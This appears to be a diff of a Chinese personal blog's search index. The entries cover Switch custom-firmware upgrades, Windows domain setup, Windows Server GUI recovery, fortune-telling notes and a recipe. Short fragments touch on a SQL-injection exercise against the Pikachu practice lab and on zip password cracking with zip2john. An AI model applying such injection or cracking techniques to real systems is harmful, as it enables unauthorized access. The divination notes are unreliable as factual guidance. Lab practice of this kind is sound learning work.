+    <title>switch大气层升级18.1.0</title>
+    <url>/2024/08/22/switch%E5%A4%A7%E6%B0%94%E5%B1%82%E5%8D%87%E7%BA%A7/</url>
+    <content><![CDATA[<h2 id="下载离线固件和大气层最新包"><a href="#下载离线固件和大气层最新包" class="headerlink" title="下载离线固件和大气层最新包"></a>下载离线固件和大气层最新包</h2><p>下载地址:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/rumla34/Atmosphere-stable/releases/tag/1.7.1</span><br></pre></td></tr></table></figure>
+
+<p>下载大气层和固件之后，通过switch选择系统页面的usb工具替换这两个文件</p>
+<h2 id="升级步骤"><a href="#升级步骤" class="headerlink" title="升级步骤"></a>升级步骤</h2><p>仅保留emuMMC和Nintendo两个文件，其余文件删除，然后将下载的文件都解压放到sd卡根目录</p>
+<p>然后选择虚拟系统启动，打开大气层软件，一个白色太阳的图标，然后选择我们保存的大气层固件文件夹，更新即可</p>
+]]></content>
+      <categories>
+        <category>switch</category>
+      </categories>
+      <tags>
+        <tag>switch大气层</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sql注入-pikachu</title>
     <url>/2025/02/27/sql%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><p>使用burp suite工具攻击<br>如果想要去除干扰信息，后面的id&#x3D;1可以改成非法id&#x3D;-2</p>
@@ -1762,23 +1779,6 @@ run
         <tag>网络安全</tag>
         <tag>sql注入</tag>
         <tag>pikachu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>switch大气层升级18.1.0</title>
-    <url>/2024/08/22/switch%E5%A4%A7%E6%B0%94%E5%B1%82%E5%8D%87%E7%BA%A7/</url>
-    <content><![CDATA[<h2 id="下载离线固件和大气层最新包"><a href="#下载离线固件和大气层最新包" class="headerlink" title="下载离线固件和大气层最新包"></a>下载离线固件和大气层最新包</h2><p>下载地址:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/rumla34/Atmosphere-stable/releases/tag/1.7.1</span><br></pre></td></tr></table></figure>
-
-<p>下载大气层和固件之后，通过switch选择系统页面的usb工具替换这两个文件</p>
-<h2 id="升级步骤"><a href="#升级步骤" class="headerlink" title="升级步骤"></a>升级步骤</h2><p>仅保留emuMMC和Nintendo两个文件，其余文件删除，然后将下载的文件都解压放到sd卡根目录</p>
-<p>然后选择虚拟系统启动，打开大气层软件，一个白色太阳的图标，然后选择我们保存的大气层固件文件夹，更新即可</p>
-]]></content>
-      <categories>
-        <category>switch</category>
-      </categories>
-      <tags>
-        <tag>switch大气层</tag>
       </tags>
   </entry>
   <entry>
@@ -2184,6 +2184,45 @@ run
       </tags>
   </entry>
   <entry>
+    <title>windows域部署及管理</title>
+    <url>/2025/04/26/windows%E5%9F%9F%E9%83%A8%E7%BD%B2%E5%8F%8A%E7%AE%A1%E7%90%86/</url>
+    <content><![CDATA[<h2 id="windows域"><a href="#windows域" class="headerlink" title="windows域"></a>windows域</h2><ul>
+<li>单域：在网络中只建立了一个域</li>
+<li>域树：具有连续域名空间的多个域</li>
+<li>域林：由一个或者多个没有形成连续域名空的域树组成</li>
+</ul>
+<h2 id="创建域"><a href="#创建域" class="headerlink" title="创建域"></a>创建域</h2><h3 id="ip和dns设置"><a href="#ip和dns设置" class="headerlink" title="ip和dns设置"></a>ip和dns设置</h3><p>作为域控制器，也作为dns服务器，ip最好是固定不变的，可以设置静态，或者dhcp设置mac保留</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip：192.168.11.200</span><br><span class="line">dns：127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="添加角色功能"><a href="#添加角色功能" class="headerlink" title="添加角色功能"></a>添加角色功能</h3><ol>
+<li>开始</li>
+<li>基于角色或基于功能的安装</li>
+<li>从服务器池中选择服务器<br> 服务器选择自己</li>
+<li>服务器角色<br>选中Active Directory 域服务<br> 点击添加功能</li>
+<li>下一步直到安装完成</li>
+<li>右上角黄色感叹号提示<br> 点击“将此服务器提升为域控制器”<br> 添加新林，设置根域名为“haha.com”<br> dns和全局编录GC勾选，设置密码<br> 确认域名“HAHA”</li>
+<li>下一步直到安装重启</li>
+<li>安装成功，在服务器管理器中查看AD DS</li>
+</ol>
+<h3 id="域账号登录服务器"><a href="#域账号登录服务器" class="headerlink" title="域账号登录服务器"></a>域账号登录服务器</h3><p>账号开始使用原来的账号加上@haha.com，或者是HAHA&#x2F;账号登录</p>
+<h2 id="加入域"><a href="#加入域" class="headerlink" title="加入域"></a>加入域</h2><h3 id="dns设置"><a href="#dns设置" class="headerlink" title="dns设置"></a>dns设置</h3><p>设置dns为DC域控制器的ip</p>
+<h3 id="设置域"><a href="#设置域" class="headerlink" title="设置域"></a>设置域</h3><ol>
+<li>点开此电脑的属性</li>
+<li>选择隶属于域：HAHA</li>
+<li>登录管理员账号</li>
+<li>重启后使用域账号登录</li>
+</ol>
+]]></content>
+      <categories>
+        <category>系统运维</category>
+        <category>windows域</category>
+      </categories>
+      <tags>
+        <tag>windows域</tag>
+        <tag>AD DC</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>压缩包密码爆破</title>
     <url>/2024/08/10/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</url>
     <content><![CDATA[<h2 id="使用zip2john-hash值破解"><a href="#使用zip2john-hash值破解" class="headerlink" title="使用zip2john hash值破解"></a>使用zip2john hash值破解</h2><p>生成压缩包hash值</p>
@@ -2283,6 +2322,30 @@ run
       </categories>
       <tags>
         <tag>linux命令</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>windows没有图形化页面</title>
+    <url>/2025/04/26/windows%E6%B2%A1%E6%9C%89%E5%9B%BE%E5%BD%A2%E5%8C%96%E9%A1%B5%E9%9D%A2/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>如果安装windows时候选择了没有带gui的选项，仅核心，则会出现没有图形化的问题。</p>
+<blockquote>
+<p>以下的方法其实没什么用，不如重装，下面是我网上搜集来的方法，都没成功</p>
+</blockquote>
+<h2 id="检查图形化程序"><a href="#检查图形化程序" class="headerlink" title="检查图形化程序"></a>检查图形化程序</h2><p>查找位置</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dir</span> /s explorer.exe</span><br></pre></td></tr></table></figure>
+
+<p>找到可以运行试试</p>
+<h2 id="安装图形化"><a href="#安装图形化" class="headerlink" title="安装图形化"></a>安装图形化</h2><h3 id="安装gui"><a href="#安装gui" class="headerlink" title="安装gui"></a>安装gui</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">powershell</span><br><span class="line">Install-WindowsFeature Server-Gui-Shell, Server-Gui-Mgmt-Infra</span><br></pre></td></tr></table></figure>
+
+<h3 id="通过映像文件安装"><a href="#通过映像文件安装" class="headerlink" title="通过映像文件安装"></a>通过映像文件安装</h3><p>d:对应的是d盘，如果iso文件是其他盘时改为对应盘符</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">dism /get-wiminfo /wimfile:d:\sources\install.wim</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>系统运维</category>
+        <category>windows</category>
+      </categories>
+      <tags>
+        <tag>windows图形化</tag>
+        <tag>cmd</tag>
       </tags>
   </entry>
   <entry>
@@ -2409,49 +2472,6 @@ run
       </tags>
   </entry>
   <entry>
-    <title>算命</title>
-    <url>/2025/02/05/%E7%AE%97%E5%91%BD/</url>
-    <content><![CDATA[<h2 id="六神"><a href="#六神" class="headerlink" title="六神"></a>六神</h2><h3 id="手势位置"><a href="#手势位置" class="headerlink" title="手势位置"></a>手势位置</h3><p>左手三指，分别是大安、流连、速喜、赤口、小吉、空亡<br><img src="/images/pasted-71.png" alt="upload successful"></p>
-<p>速记：大、流、速、赤、小、空。</p>
-<h3 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h3><h4 id="大安"><a href="#大安" class="headerlink" title="大安"></a>大安</h4><p>1、身不动时（如果算一个人在干什么）<br>2、五行：属木<br>3、方位：东<br>4、神煞：青龙<br>5、数字：1、5、7<br>6、安心吉祥的意思</p>
-<p>口诀：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">大安事事昌</span><br><span class="line">求谋在东方</span><br><span class="line">失物去不远</span><br><span class="line">宅家保平安</span><br><span class="line">行人身未动</span><br><span class="line">病者主无妨</span><br><span class="line">将军回田野</span><br><span class="line">仔细更推详</span><br></pre></td></tr></table></figure>
-
-<h4 id="留连"><a href="#留连" class="headerlink" title="留连"></a>留连</h4><p>1、人未归时<br>2、五行属水<br>3、黑色<br>4、方位北<br>5、玄武<br>6、数字：2、8、10<br>7、有暗昧不明、延迟、纠缠、拖延、漫长之意</p>
-<p>口诀：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">留连事难成</span><br><span class="line">求谋日未明</span><br><span class="line">官事凡宜缓</span><br><span class="line">去者未回程</span><br><span class="line">失物南方见</span><br><span class="line">急讨方心称</span><br><span class="line">更须防口舌</span><br><span class="line">人口且平平</span><br></pre></td></tr></table></figure>
-
-<h4 id="速喜"><a href="#速喜" class="headerlink" title="速喜"></a>速喜</h4><p>1、人即至时<br>2、五行属火<br>3、红色<br>4、方位为南方<br>5、数字：3,6,9<br>6、有快速、吉利、时机已到之意</p>
-<p>口诀：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">速喜喜来临</span><br><span class="line">求财向南行</span><br><span class="line">失物申未午（南、西南）</span><br><span class="line">逢人路上寻</span><br><span class="line">官事有福德</span><br><span class="line">病者无祸侵</span><br><span class="line">田宅六畜吉</span><br><span class="line">行人有信音</span><br></pre></td></tr></table></figure>
-
-<h4 id="赤口"><a href="#赤口" class="headerlink" title="赤口"></a>赤口</h4><p>1、官事凶时<br>2、五行属金<br>3、白色<br>4、西方<br>5、白虎<br>6、数字：4，7，10<br>7、有不吉、惊恐、凶险、口舌是非之意</p>
-<p>口诀：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">赤口主口舌</span><br><span class="line">官非切宜防</span><br><span class="line">失物急去寻</span><br><span class="line">行人有惊慌</span><br><span class="line">鸡犬（六畜）多作怪</span><br><span class="line">病者出西方</span><br><span class="line">更须防咀咒</span><br><span class="line">诚恐染瘟皇</span><br></pre></td></tr></table></figure>
-
-<h4 id="小吉"><a href="#小吉" class="headerlink" title="小吉"></a>小吉</h4><p>1、人来喜时<br>2、五行属木<br>3、六合<br>4、数字：1,5,7<br>5、有和合、吉利之意</p>
-<p>口诀：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小吉最吉昌</span><br><span class="line">路上好商量</span><br><span class="line">阴人来报喜</span><br><span class="line">失物在坤方（西南）</span><br><span class="line">行人即便至</span><br><span class="line">交易甚是强</span><br><span class="line">凡事皆和合</span><br><span class="line">病者祈上苍</span><br></pre></td></tr></table></figure>
-
-<h4 id="空亡"><a href="#空亡" class="headerlink" title="空亡"></a>空亡</h4><p>1、音信稀时<br>2、五行属土<br>3、黄色<br>4、中央<br>5、勾陈<br>6、数字：3,6,9<br>7、有不吉、无果之意</p>
-<p>口诀：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">空亡事不祥</span><br><span class="line">阴人多乖张</span><br><span class="line">求财无利益</span><br><span class="line">行人有灾殃</span><br><span class="line">失物寻一见</span><br><span class="line">官事有刑伤</span><br><span class="line">病人逢暗鬼</span><br><span class="line">祈解保安康</span><br></pre></td></tr></table></figure>
-
-<h2 id="奇门"><a href="#奇门" class="headerlink" title="奇门"></a>奇门</h2><h3 id="九宫五行"><a href="#九宫五行" class="headerlink" title="九宫五行"></a>九宫五行</h3><p>五行生克关系<br><img src="/images/pasted-74.png" alt="upload successful"><br>九宫位置<br><img src="/images/pasted-73.png" alt="upload successful"><br>东南西北位置<br><img src="/images/pasted-75.png" alt="upload successful"></p>
-<h2 id="干支"><a href="#干支" class="headerlink" title="干支"></a>干支</h2><p>甲乙东方木，丙丁南方火，戊己中央土，庚辛西方金，壬癸北方水</p>
-<p>寅卯为木居东方，巳午为火居正南，<br>申酉属金位在西，子亥属水在北边，<br>辰戌丑未皆属土，分别居于四维偏，<br>辰在东南戌西北，丑在东北未西南。</p>
-<h2 id="时辰"><a href="#时辰" class="headerlink" title="时辰"></a>时辰</h2><p>子丑寅卯辰巳午未申酉戌亥</p>
-]]></content>
-      <categories>
-        <category>生活</category>
-        <category>玄学</category>
-      </categories>
-      <tags>
-        <tag>算命知识</tag>
-        <tag>小六壬</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>羊肉火锅-牛油辣味</title>
     <url>/2025/02/04/%E7%BE%8A%E8%82%89%E7%81%AB%E9%94%85-%E7%89%9B%E6%B2%B9%E8%BE%A3%E5%91%B3/</url>
     <content><![CDATA[<h2 id="配料"><a href="#配料" class="headerlink" title="配料"></a>配料</h2><p>配料表中的量不包括焯水等步骤的损耗</p>
@@ -2523,6 +2543,49 @@ width: 20%;
       <tags>
         <tag>羊肉火锅</tag>
         <tag>菜谱</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>算命</title>
+    <url>/2025/02/05/%E7%AE%97%E5%91%BD/</url>
+    <content><![CDATA[<h2 id="六神"><a href="#六神" class="headerlink" title="六神"></a>六神</h2><h3 id="手势位置"><a href="#手势位置" class="headerlink" title="手势位置"></a>手势位置</h3><p>左手三指，分别是大安、流连、速喜、赤口、小吉、空亡<br><img src="/images/pasted-71.png" alt="upload successful"></p>
+<p>速记：大、流、速、赤、小、空。</p>
+<h3 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h3><h4 id="大安"><a href="#大安" class="headerlink" title="大安"></a>大安</h4><p>1、身不动时（如果算一个人在干什么）<br>2、五行：属木<br>3、方位：东<br>4、神煞：青龙<br>5、数字：1、5、7<br>6、安心吉祥的意思</p>
+<p>口诀：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">大安事事昌</span><br><span class="line">求谋在东方</span><br><span class="line">失物去不远</span><br><span class="line">宅家保平安</span><br><span class="line">行人身未动</span><br><span class="line">病者主无妨</span><br><span class="line">将军回田野</span><br><span class="line">仔细更推详</span><br></pre></td></tr></table></figure>
+
+<h4 id="留连"><a href="#留连" class="headerlink" title="留连"></a>留连</h4><p>1、人未归时<br>2、五行属水<br>3、黑色<br>4、方位北<br>5、玄武<br>6、数字：2、8、10<br>7、有暗昧不明、延迟、纠缠、拖延、漫长之意</p>
+<p>口诀：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">留连事难成</span><br><span class="line">求谋日未明</span><br><span class="line">官事凡宜缓</span><br><span class="line">去者未回程</span><br><span class="line">失物南方见</span><br><span class="line">急讨方心称</span><br><span class="line">更须防口舌</span><br><span class="line">人口且平平</span><br></pre></td></tr></table></figure>
+
+<h4 id="速喜"><a href="#速喜" class="headerlink" title="速喜"></a>速喜</h4><p>1、人即至时<br>2、五行属火<br>3、红色<br>4、方位为南方<br>5、数字：3,6,9<br>6、有快速、吉利、时机已到之意</p>
+<p>口诀：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">速喜喜来临</span><br><span class="line">求财向南行</span><br><span class="line">失物申未午（南、西南）</span><br><span class="line">逢人路上寻</span><br><span class="line">官事有福德</span><br><span class="line">病者无祸侵</span><br><span class="line">田宅六畜吉</span><br><span class="line">行人有信音</span><br></pre></td></tr></table></figure>
+
+<h4 id="赤口"><a href="#赤口" class="headerlink" title="赤口"></a>赤口</h4><p>1、官事凶时<br>2、五行属金<br>3、白色<br>4、西方<br>5、白虎<br>6、数字：4，7，10<br>7、有不吉、惊恐、凶险、口舌是非之意</p>
+<p>口诀：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">赤口主口舌</span><br><span class="line">官非切宜防</span><br><span class="line">失物急去寻</span><br><span class="line">行人有惊慌</span><br><span class="line">鸡犬（六畜）多作怪</span><br><span class="line">病者出西方</span><br><span class="line">更须防咀咒</span><br><span class="line">诚恐染瘟皇</span><br></pre></td></tr></table></figure>
+
+<h4 id="小吉"><a href="#小吉" class="headerlink" title="小吉"></a>小吉</h4><p>1、人来喜时<br>2、五行属木<br>3、六合<br>4、数字：1,5,7<br>5、有和合、吉利之意</p>
+<p>口诀：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小吉最吉昌</span><br><span class="line">路上好商量</span><br><span class="line">阴人来报喜</span><br><span class="line">失物在坤方（西南）</span><br><span class="line">行人即便至</span><br><span class="line">交易甚是强</span><br><span class="line">凡事皆和合</span><br><span class="line">病者祈上苍</span><br></pre></td></tr></table></figure>
+
+<h4 id="空亡"><a href="#空亡" class="headerlink" title="空亡"></a>空亡</h4><p>1、音信稀时<br>2、五行属土<br>3、黄色<br>4、中央<br>5、勾陈<br>6、数字：3,6,9<br>7、有不吉、无果之意</p>
+<p>口诀：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">空亡事不祥</span><br><span class="line">阴人多乖张</span><br><span class="line">求财无利益</span><br><span class="line">行人有灾殃</span><br><span class="line">失物寻一见</span><br><span class="line">官事有刑伤</span><br><span class="line">病人逢暗鬼</span><br><span class="line">祈解保安康</span><br></pre></td></tr></table></figure>
+
+<h2 id="奇门"><a href="#奇门" class="headerlink" title="奇门"></a>奇门</h2><h3 id="九宫五行"><a href="#九宫五行" class="headerlink" title="九宫五行"></a>九宫五行</h3><p>五行生克关系<br><img src="/images/pasted-74.png" alt="upload successful"><br>九宫位置<br><img src="/images/pasted-73.png" alt="upload successful"><br>东南西北位置<br><img src="/images/pasted-75.png" alt="upload successful"></p>
+<h2 id="干支"><a href="#干支" class="headerlink" title="干支"></a>干支</h2><p>甲乙东方木，丙丁南方火，戊己中央土，庚辛西方金，壬癸北方水</p>
+<p>寅卯为木居东方，巳午为火居正南，<br>申酉属金位在西，子亥属水在北边，<br>辰戌丑未皆属土，分别居于四维偏，<br>辰在东南戌西北，丑在东北未西南。</p>
+<h2 id="时辰"><a href="#时辰" class="headerlink" title="时辰"></a>时辰</h2><p>子丑寅卯辰巳午未申酉戌亥</p>
+]]></content>
+      <categories>
+        <category>生活</category>
+        <category>玄学</category>
+      </categories>
+      <tags>
+        <tag>算命知识</tag>
+        <tag>小六壬</tag>
       </tags>
   </entry>
   <entry>
